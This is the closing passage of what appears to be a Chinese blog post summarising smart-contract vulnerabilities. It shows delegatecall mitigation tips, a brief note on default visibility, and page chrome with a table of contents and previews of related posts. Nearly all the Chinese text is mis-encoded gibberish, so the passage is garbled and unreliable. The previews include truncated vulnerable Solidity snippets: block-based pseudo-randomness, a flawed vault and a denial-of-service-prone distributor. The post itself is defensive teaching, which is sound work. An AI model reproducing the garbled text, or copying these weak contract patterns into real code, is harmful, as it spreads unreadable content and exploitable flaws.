<li><strong>ç¦æ­¢å°†å¤–éƒ¨ä»»æ„ calldata ç›´æ¥è½¬å‘ç»™ library</strong>ï¼ˆä¸è¦å®ç° <code>fallback()</code> ä¸­æ— æ ¡éªŒåœ° <code>delegatecall(msg.data)</code>ï¼‰ã€‚</li>
<li><strong>å°† library åœ°å€è®¾ä¸ºä¸å¯å˜ï¼ˆ<code>immutable</code>&#x2F;<code>constant</code>ï¼‰æˆ–åªæœ‰ owner å¯å˜</strong>ï¼Œå¹¶å¯¹ä¿®æ”¹æ“ä½œåŠ ä¸¥æ ¼æƒé™å’Œå®¡è®¡ã€‚</li>
<li><strong>å¯¹å…³é”® storage çš„å†™å…¥åŠ å…¥é¢å¤–æ ¡éªŒ</strong>ï¼ˆä¾‹å¦‚æ£€æŸ¥å†™å…¥å‰åå€¼çš„åˆç†æ€§æˆ–ä½¿ç”¨ access controlï¼‰ã€‚</li>
<li><strong>å°½é‡ä½¿ç”¨ <code>delegatecall</code> çš„æ›¿ä»£æ–¹æ¡ˆ</strong>ï¼ˆå¦‚ <code>library</code> çš„ internal&#x2F;linked library æˆ–æ˜ç¡®çš„ proxy æ¨¡å¼å¹¶åšå¥½åˆå§‹åŒ–&#x2F;æ£€æŸ¥ï¼‰ã€‚</li>
</ul>
<h1 id="é»˜è®¤çš„å¯è§æ€§"><a href="#é»˜è®¤çš„å¯è§æ€§" class="headerlink" title="é»˜è®¤çš„å¯è§æ€§"></a>é»˜è®¤çš„å¯è§æ€§</h1><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œå°±æ˜¯å¯è§æ€§è®¾ç½®é”™äº†è®©é»‘å®¢æœ‰å¯ä¹˜ä¹‹æœºã€‚</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://kizzy899.github.io">kizy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/">https://kizzy899.github.io/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%931/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://kizzy899.github.io" target="_blank">EIGHTJIU</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/">åˆçº¦å®¡è®¡</a></div><div class="post-share"><div class="social-share" data-image="/aaaset/cover_8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%932/" title="åŸºç¡€æ¼æ´æ€»ç»“2"><img class="cover" src="/aaaset/cover_9.jpg" onerror="onerror=null;src='/img/404page.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">åŸºç¡€æ¼æ´æ€»ç»“2</div></div><div class="info-2"><div class="info-item-1">éšæœºé”™è§‰(Entropy lllusion)éšæœºé”™è§‰ï¼Œä¹Ÿç§°ä¸ºç†µé”™è§‰ï¼ŒæŒ‡çš„æ˜¯å¼€å‘è€…é”™è¯¯åœ°è®¤ä¸ºåœ¨åŒºå—é“¾ä¸Šå¯ä»¥è½»æ˜“åœ°è·å¾—å®‰å…¨ã€ä¸å¯é¢„æµ‹çš„éšæœºæ•°ã€‚ ç®€å•æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç§â€œæˆ‘ä»¥ä¸ºå®ƒæ˜¯éšæœºçš„ï¼Œä½†å®é™…ä¸Šå¹¶éå¦‚æ­¤â€çš„è®¤çŸ¥é”™è¯¯ã€‚ ç¤ºä¾‹ä¸€ä¸ªç§æœ‰è§†å›¾å‡½æ•°ï¼Œç”¨äºæ ¹æ®ä¸€å®šçš„éšæœºæ€§æ¡ä»¶åˆ¤æ–­æ˜¯å¦æ‰§è¡Œç©ºæŠ•ã€‚ 123456789101112131415function airdrop() private view returns(bool)&#123;    uint256 seed = uint256(keccak256(abi.encodePacked(        (block.timestamp).add        (block.difficulty).add        ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add        (block.gaslimit).add        ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).a...</div></div></div></a><a class="pagination-related" href="/2025/10/10/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/" title="å…³äºGit å­æ¨¡å—ï¼ˆå­æ–‡æ¡£ï¼‰"><img class="cover" src="/aaaset/cover_18.jpg" onerror="onerror=null;src='/img/404page.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">å…³äºGit å­æ¨¡å—ï¼ˆå­æ–‡æ¡£ï¼‰</div></div><div class="info-2"><div class="info-item-1">é—®é¢˜å‘ç°&amp;è§£å†³ä»€ä¹ˆæ˜¯å­æ¨¡å—ï¼ˆå­æ–‡æ¡£ï¼‰ å®šä¹‰ï¼šGit å­æ¨¡å—ï¼ˆsubmoduleï¼‰æ˜¯ä¸€ä¸ªåµŒå¥—åœ¨çˆ¶ä»“åº“ä¸­çš„ç‹¬ç«‹ Git ä»“åº“ã€‚ ä½œç”¨ï¼šå…è®¸ä½ åœ¨ä¸€ä¸ª Git ä»“åº“ä¸­å¼•ç”¨å¦ä¸€ä¸ªä»“åº“ï¼Œå¹¶ä¿æŒç‹¬ç«‹ç‰ˆæœ¬æ§åˆ¶ã€‚ ç‰¹ç‚¹ï¼š æœ‰è‡ªå·±çš„ .git ç›®å½•æˆ–ç”±çˆ¶ä»“åº“ .gitmodules ç®¡ç†ã€‚ GitHub ä¸Šæ˜¾ç¤ºä¸º ç®­å¤´æ–‡ä»¶å¤¹ï¼Œç‚¹å‡»ä¼šè·³è½¬åˆ°å­æ¨¡å—çš„è¿œç¨‹ä»“åº“ã€‚ æœ¬åœ°æœªåˆå§‹åŒ–æˆ–æ›´æ–°æ—¶ï¼Œä¼šå‡ºç° in unpopulated submodule æŠ¥é”™ã€‚     å¦‚ä½•å‘ç°æ–‡ä»¶å¤¹è¢«ä¸Šä¼ æˆå­æ¨¡å—  GitHub æ–‡ä»¶æµè§ˆå™¨ï¼š  æ–‡ä»¶å¤¹å‰æœ‰ ç®­å¤´æ ‡è®°ã€‚ ç‚¹å‡»ä¼šè·³åˆ°å­æ¨¡å—å¯¹åº”çš„è¿œç¨‹ä»“åº“ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ™®é€šæ–‡ä»¶åˆ—è¡¨ã€‚   æœ¬åœ°æ“ä½œï¼š  æ‰§è¡Œ git status æˆ– git submodule status å¯èƒ½æ˜¾ç¤ºå­æ¨¡å—ä¿¡æ¯ã€‚  å¯¹æœªåˆå§‹åŒ–çš„å­æ¨¡å—æ“ä½œæ–‡ä»¶ä¼šæŠ¥é”™ï¼Œä¾‹å¦‚ï¼š 1in unpopulated submodule     ä¸ºä»€ä¹ˆæ–‡ä»¶å¤¹ä¼šè¢«è¯†åˆ«ä¸ºå­æ¨¡å— è¯¯æ“ä½œæ·»åŠ å­æ¨¡å—ï¼š 1git submodule add &lt;repo_url&gt; å­æ–‡ä»¶å¤¹å   Git ä¼šè®°å½•å­æ¨¡å—ä¿¡æ¯åœ¨ .gitmodules...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A2%98%E8%A7%A3/" title="è®°ä¸€æ¬¡é¢˜è§£"><img class="cover" src="/cover/cover9.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-15</div><div class="info-item-2">è®°ä¸€æ¬¡é¢˜è§£</div></div><div class="info-2"><div class="info-item-1">ç¬¬ä¸€é¢˜æœ‰æ— é™¤äº†ç›´æ¥ç‚¹å‡»deployå¤–çš„å…¶ä»–æ–¹æ³•éƒ¨ç½²ä¸€ä¸ªåˆçº¦ ç¬¬ä¸€é¢˜é¢˜è§£createå’Œcreate2 ç¬¬äºŒé¢˜ç®€å•è¯´è¯´æ€æ ·ä¼˜åŒ–ä¸€ä¸‹è¿™ä¸ªç§äººé‡‘åº“åˆçº¦ 1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    address public owner;    receive() external payable &#123;        // just a receive function    &#125;    function deposit() external view payable &#123;        require(msg.value &gt; 0, &quot;Must send some ether&quot;);        // code? what code?    &#125;    function getBalance() internal view retur...</div></div></div></a><a class="pagination-related" href="/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%933/" title="åŸºç¡€æ¼æ´æ€»ç»“3"><img class="cover" src="/aaaset/cover_10.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-13</div><div class="info-item-2">åŸºç¡€æ¼æ´æ€»ç»“3</div></div><div class="info-2"><div class="info-item-1">æ‹’ç»æœåŠ¡æ‹’ç»æœåŠ¡æŒ‡çš„æ˜¯æ”»å‡»è€…é€šè¿‡æŸç§æ–¹å¼é˜»æ­¢åˆçº¦æ­£å¸¸æ‰§è¡Œå…¶é¢„æœŸåŠŸèƒ½ï¼Œä½¿å¾—åˆçº¦æ— æ³•ç»§ç»­æœåŠ¡åˆæ³•ç”¨æˆ·ã€‚ ç®€å•æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç§â€æˆ‘è®©ä½ æ— æ³•æ­£å¸¸å·¥ä½œâ€çš„æ”»å‡»æ–¹å¼ã€‚åœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼ŒDoSæ”»å‡»é€šå¸¸é€šè¿‡æ“çºµåˆçº¦çŠ¶æ€æˆ–åˆ©ç”¨æ‰§è¡Œé™åˆ¶æ¥å®ç°ã€‚ ç¤ºä¾‹ä¸€ä¸ªä»£å¸åˆ†å‘åˆçº¦ï¼Œè´Ÿè´£æ”¶é›†æŠ•èµ„å¹¶å‘æŠ•èµ„è€…åˆ†å‘å›æŠ¥ï¼š 123456789101112131415161718192021contract DistributeTokens &#123;    address public owner; // gets set somewhere    address[] investors; // array of investors    uint[] investorBalances; // the amount investor gets    bool public isFinalized = false;        // ...        function invest() public payable &#123;        investors.push(msg.sender);        inves...</div></div></div></a><a class="pagination-related" href="/2025/10/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%932/" title="åŸºç¡€æ¼æ´æ€»ç»“2"><img class="cover" src="/aaaset/cover_9.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-13</div><div class="info-item-2">åŸºç¡€æ¼æ´æ€»ç»“2</div></div><div class="info-2"><div class="info-item-1">éšæœºé”™è§‰(Entropy lllusion)éšæœºé”™è§‰ï¼Œä¹Ÿç§°ä¸ºç†µé”™è§‰ï¼ŒæŒ‡çš„æ˜¯å¼€å‘è€…é”™è¯¯åœ°è®¤ä¸ºåœ¨åŒºå—é“¾ä¸Šå¯ä»¥è½»æ˜“åœ°è·å¾—å®‰å…¨ã€ä¸å¯é¢„æµ‹çš„éšæœºæ•°ã€‚ ç®€å•æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç§â€œæˆ‘ä»¥ä¸ºå®ƒæ˜¯éšæœºçš„ï¼Œä½†å®é™…ä¸Šå¹¶éå¦‚æ­¤â€çš„è®¤çŸ¥é”™è¯¯ã€‚ ç¤ºä¾‹ä¸€ä¸ªç§æœ‰è§†å›¾å‡½æ•°ï¼Œç”¨äºæ ¹æ®ä¸€å®šçš„éšæœºæ€§æ¡ä»¶åˆ¤æ–­æ˜¯å¦æ‰§è¡Œç©ºæŠ•ã€‚ 123456789101112131415function airdrop() private view returns(bool)&#123;    uint256 seed = uint256(keccak256(abi.encodePacked(        (block.timestamp).add        (block.difficulty).add        ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add        (block.gaslimit).add        ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).a...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/aaaset/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">kizy</div><div class="author-info-description">rainbow</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/kizzy899"><i class="fab fa-github"></i><span>my github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kizzy899" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">Sampre avanti</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%8D%E5%85%A5re-entrancy"><span class="toc-number">1.</span> <span class="toc-text">é‡å…¥re-entrancy</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.1.</span> <span class="toc-text">ç¤ºä¾‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E7%A1%AE%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">æ­£ç¡®çš„ä¿®å¤æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%BD%A0%E7%9A%84%E5%90%88%E7%BA%A6%E6%98%AF%E5%90%A6%E6%98%93%E8%A2%AB%E9%87%8D%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">å¦‚ä½•åˆ¤æ–­ä½ çš„åˆçº¦æ˜¯å¦æ˜“è¢«é‡å…¥</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ATN%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">ATNæ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ERC223"><span class="toc-number">2.1.</span> <span class="toc-text">ERC223</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-ERC20-%E4%B8%80%E6%AC%A1%E8%BD%AC%E8%B4%A6%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E8%B0%83%E7%94%A8%E4%B8%A4%E6%AC%A1%EF%BC%8C%E8%80%8C-ERC223-%E5%8F%AA%E9%9C%80%E8%A6%81%E4%B8%80%E6%AC%A1%EF%BC%9F"><span class="toc-number">2.1.1.</span> <span class="toc-text">ä¸ºä»€ä¹ˆ ERC20 ä¸€æ¬¡è½¬è´¦å¯èƒ½ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œè€Œ ERC223 åªéœ€è¦ä¸€æ¬¡ï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-ERC20-%E7%9A%84%E7%BC%BA%E9%99%B7"><span class="toc-number">2.1.2.</span> <span class="toc-text">ğŸ”¹ ERC20 çš„ç¼ºé™·</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9-ERC223-%E7%9A%84%E6%94%B9%E8%BF%9B"><span class="toc-number">2.1.3.</span> <span class="toc-text">ğŸ”¹ ERC223 çš„æ”¹è¿›</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DS-Auth%E5%BA%93"><span class="toc-number">2.2.</span> <span class="toc-text">DS-Authåº“</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-DS-Auth-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">1) DS-Auth æ˜¯ä»€ä¹ˆ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-msg-sig-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">2) msg.sig æ˜¯ä»€ä¹ˆ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ERC223-%E7%9A%84%E5%9B%9E%E8%B0%83%E6%9C%BA%E5%88%B6%E4%B8%BA%E4%BD%95%E5%B8%A6%E6%9D%A5%E9%A3%8E%E9%99%A9"><span class="toc-number">2.2.1.</span> <span class="toc-text">ERC223 çš„å›è°ƒæœºåˆ¶ä¸ºä½•å¸¦æ¥é£é™©</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-number">2.2.2.</span> <span class="toc-text">æ”»å‡»åŸç†æ¦‚è¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%EF%BC%88%E6%8A%BD%E8%B1%A1%EF%BC%89%E7%A4%BA%E4%BE%8B%E6%B5%81%E7%A8%8B"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">ä¸€ä¸ªç®€å•ï¼ˆæŠ½è±¡ï¼‰ç¤ºä¾‹æµç¨‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E7%B1%BB%E6%94%BB%E5%87%BB%E5%AE%B9%E6%98%93%E8%A2%AB%E5%BF%BD%E8%A7%86-%E6%88%90%E5%8A%9F%E7%8E%87%E9%AB%98"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">ä¸ºä»€ä¹ˆè¿™ç±»æ”»å‡»å®¹æ˜“è¢«å¿½è§† &#x2F; æˆåŠŸç‡é«˜</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E4%B8%8E%E5%AE%9E%E8%B7%B5%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.2.2.3.</span> <span class="toc-text">é˜²å¾¡ä¸å®è·µå»ºè®®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.2.2.4.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ATN-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">ATN æ”»å‡»æµç¨‹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%97%E6%9C%AF%E6%BA%A2%E5%87%BA-under-flows"><span class="toc-number">3.</span> <span class="toc-text">ç®—æœ¯æº¢å‡º(under flows)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">3.1.</span> <span class="toc-text">ç¤ºä¾‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">ä¿®å¤æ–¹æ³•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B-%E5%90%88%E7%BA%A6PolyAi-AI"><span class="toc-number">3.3.</span> <span class="toc-text">æ¼æ´å®ä¾‹:åˆçº¦PolyAi(AI)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%9C%9C%E7%BD%90%E5%90%88%E7%BA%A6"><span class="toc-number">4.</span> <span class="toc-text">èœœç½åˆçº¦</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%B8%80"><span class="toc-number">4.1.</span> <span class="toc-text">åˆçº¦ä¸€</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.1.</span> <span class="toc-text">ä¸ºä»€ä¹ˆä¼šæ”»å‡»</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%BA%8C"><span class="toc-number">4.2.</span> <span class="toc-text">åˆçº¦äºŒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E4%B8%89"><span class="toc-number">4.3.</span> <span class="toc-text">åˆçº¦ä¸‰</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Solidity-%E5%90%88%E7%BA%A6%E5%AD%98%E5%82%A8%E6%A7%BD%E8%A7%84%E5%88%99"><span class="toc-number">4.3.1.</span> <span class="toc-text">1. Solidity åˆçº¦å­˜å‚¨æ§½è§„åˆ™</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E5%AD%98%E5%82%A8%E6%A7%BD%E7%9A%84%E5%80%BC"><span class="toc-number">4.3.2.</span> <span class="toc-text">2. è·å–å­˜å‚¨æ§½çš„å€¼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%88ethers-js%EF%BC%89"><span class="toc-number">4.3.3.</span> <span class="toc-text">ç¤ºä¾‹ï¼ˆethers.jsï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%90%86%E8%AE%BA%E6%8E%A8%E7%AE%97"><span class="toc-number">4.3.4.</span> <span class="toc-text">3. ç†è®ºæ¨ç®—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">4.3.5.</span> <span class="toc-text">4. æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E8%84%9A%E6%9C%AC"><span class="toc-number">4.4.</span> <span class="toc-text">è¯»å–è„šæœ¬</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toc-number">4.4.1.</span> <span class="toc-text">ä½¿ç”¨è¯´æ˜</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%84%8F%E5%A4%96%E4%B9%8B%E8%B4%A2"><span class="toc-number">5.</span> <span class="toc-text">æ„å¤–ä¹‹è´¢</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%90%88%E7%BA%A6%E7%A4%BA%E4%BE%8B"><span class="toc-number">5.0.1.</span> <span class="toc-text">1. åˆçº¦ç¤ºä¾‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%97%AE%E9%A2%98%E4%B8%8E%E9%A3%8E%E9%99%A9%EF%BC%88%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%87%BA%E7%8E%B0%E2%80%9C%E6%84%8F%E5%A4%96%E4%B9%8B%E8%B4%A2%E2%80%9D%EF%BC%89"><span class="toc-number">5.0.2.</span> <span class="toc-text">2. é—®é¢˜ä¸é£é™©ï¼ˆä¸ºä»€ä¹ˆä¼šå‡ºç°â€œæ„å¤–ä¹‹è´¢â€ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A4%BA%E4%BE%8B%E6%94%BB%E5%87%BB-%E8%A7%A6%E5%8F%91%E5%9C%BA%E6%99%AF"><span class="toc-number">5.0.3.</span> <span class="toc-text">3. ç¤ºä¾‹æ”»å‡»&#x2F;è§¦å‘åœºæ™¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%89%E7%A7%8D%E4%B8%8D%E4%BC%9A%E8%A7%A6%E5%8F%91-EVM-%E5%90%88%E7%BA%A6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%BD%86%E4%BC%9A%E5%BD%B1%E5%93%8D%E5%90%88%E7%BA%A6%E4%BD%99%E9%A2%9D%E7%9A%84%E9%80%94%E5%BE%84"><span class="toc-number">5.0.4.</span> <span class="toc-text">4. ä¸‰ç§ä¸ä¼šè§¦å‘ EVM åˆçº¦ä»£ç æ‰§è¡Œä½†ä¼šå½±å“åˆçº¦ä½™é¢çš„é€”å¾„</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">5.0.5.</span> <span class="toc-text">5. é˜²å¾¡ä¸æœ€ä½³å®è·µ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegatecall"><span class="toc-number">6.</span> <span class="toc-text">Delegatecall</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Vulnerable-FibonacciBalance%EF%BC%88%E5%AD%98%E5%9C%A8-delegatecall-%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AD%98%E5%82%A8%E6%B1%A1%E6%9F%93%E9%97%AE%E9%A2%98%EF%BC%89"><span class="toc-number">6.1.</span> <span class="toc-text">1. Vulnerable: FibonacciBalanceï¼ˆå­˜åœ¨ delegatecall å¯¼è‡´çš„å­˜å‚¨æ±¡æŸ“é—®é¢˜ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Intended-library-FibonacciLib%EF%BC%88%E6%AD%A3%E5%B8%B8%E5%AE%9E%E7%8E%B0%EF%BC%8C%E6%8C%89%E8%87%AA%E8%BA%AB-storage-%E5%B8%83%E5%B1%80%E5%86%99%E5%85%A5%EF%BC%89"><span class="toc-number">6.2.</span> <span class="toc-text">2. Intended library: FibonacciLibï¼ˆæ­£å¸¸å®ç°ï¼ŒæŒ‰è‡ªèº« storage å¸ƒå±€å†™å…¥ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%81%B6%E6%84%8F%E5%BA%93%EF%BC%9AMaliciousLib%EF%BC%88%E9%80%9A%E8%BF%87%E5%86%99%E5%85%A5%E7%89%B9%E5%AE%9A-storage-slot-%E6%9D%A5%E7%AF%A1%E6%94%B9%E8%B0%83%E7%94%A8%E8%80%85%E5%90%88%E7%BA%A6%E7%9A%84%E5%85%B3%E9%94%AE%E5%8F%98%E9%87%8F%EF%BC%89"><span class="toc-number">6.3.</span> <span class="toc-text">3. æ¶æ„åº“ï¼šMaliciousLibï¼ˆé€šè¿‡å†™å…¥ç‰¹å®š storage slot æ¥ç¯¡æ”¹è°ƒç”¨è€…åˆçº¦çš„å…³é”®å˜é‡ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6%EF%BC%88%E7%A4%BA%E4%BE%8B%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%89"><span class="toc-number">6.4.</span> <span class="toc-text">4. æ”»å‡»åˆçº¦ï¼ˆç¤ºä¾‹æ”»å‡»æµç¨‹ï¼‰</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%BC%8F%E6%B4%9E%E8%A6%81%E7%82%B9"><span class="toc-number">6.5.</span> <span class="toc-text">5. æ¼æ´è¦ç‚¹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">6.6.</span> 